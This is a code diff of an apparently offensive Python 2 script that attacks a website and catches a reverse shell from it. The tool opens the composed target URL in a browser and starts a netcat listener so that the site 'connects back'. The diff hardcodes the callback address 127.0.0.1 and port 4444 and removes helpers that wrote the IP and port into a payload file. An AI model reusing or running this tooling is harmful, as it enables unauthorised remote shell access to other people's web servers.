@@ -11,47 +11,16 @@ def foo():
     no = {'no', 'n'}
     choice = raw_input().lower()
     if choice in yes:
-        # Make sure user enters the wanted IP.
-        print("Seems about right. Remember to prompt \"exit\" twice when you are done. \n"
-              "Input the IP you want the target to connect back to:")
-        back_ip = raw_input()
-        print("Confirm: [y/n]")
-        confirm = raw_input()
-        confirmed = False
-        if confirm in no:
-            while not confirmed:
-                print("Input the IP you want the target to connect back to:")
-                back_ip = raw_input()
-                print("Confirm: [y/n]")
-                confirm = raw_input()
-                if confirm in yes:
-                    confirmed = True
+
+        print("Seems about right. Remember to prompt \"exit\" twice when you are done.")
+        back_ip = "127.0.0.1"
         print("Target website will connect back to " + back_ip)
 
-        # Make sure the user enters the wanted port.
-        print("Input the port you want the target to connect back to:")
-        port = raw_input()
-        print("Confirm: [y/n]")
-        confirm = raw_input()
-        confirmed = False
-        if confirm in no:
-            while not confirmed:
-                print("Input the port you want the target to connect back to:")
-                port = raw_input()
-                print("Confirm: [y/n]")
-                confirm = raw_input()
-                if confirm in yes:
-                    confirmed = True
-        print("Port " + port + " will be used.")
-
-        # Modify the payload file in order to set ip and port
-        modify_payload_ip_port(back_ip, port)
+        port = 4444
+        print("Port " + str(port) + " will be used.")
 
         # Composing URLs, listening for connections and connecting to target
         listen(str(port))
-
-        # Delete ip and port fields inside the payload file
-        standardize_payload(back_ip, port)
 
         print("Connection closed.")
         return True
@@ -85,33 +54,6 @@ def connect_to_target(target_ip, port):
     print("Connecting to target...")
     webbrowser.open(target_url, new=0, autoraise=False)
     subprocess.check_call(["nc", "-l", port])
-
-
-def modify_payload_ip_port(ip, port):
-
-    with open('payload.txt', 'r') as in_file:
-        payload = in_file.read()
-        in_file.close()
-
-    payload = payload.replace('ip = ', 'ip = \\\"' + ip + '\\\"')
-    payload = payload.replace('port = ', 'port = ' + str(port))
-
-    with open('payload.txt', 'w') as out_file:
-        out_file.write(payload)
-        out_file.close()
-
-
-def standardize_payload(ip, port):
-    with open('payload.txt', 'r') as in_file:
-        payload = in_file.read()
-        in_file.close()
-
-    payload = payload.replace('ip = \\\"' + ip + '\\\"', 'ip = ')
-    payload = payload.replace('port = ' + str(port), 'port = ')
-
-    with open('payload.txt', 'w') as out_file:
-        out_file.write(payload)
-        out_file.close()
 
 
 foo()
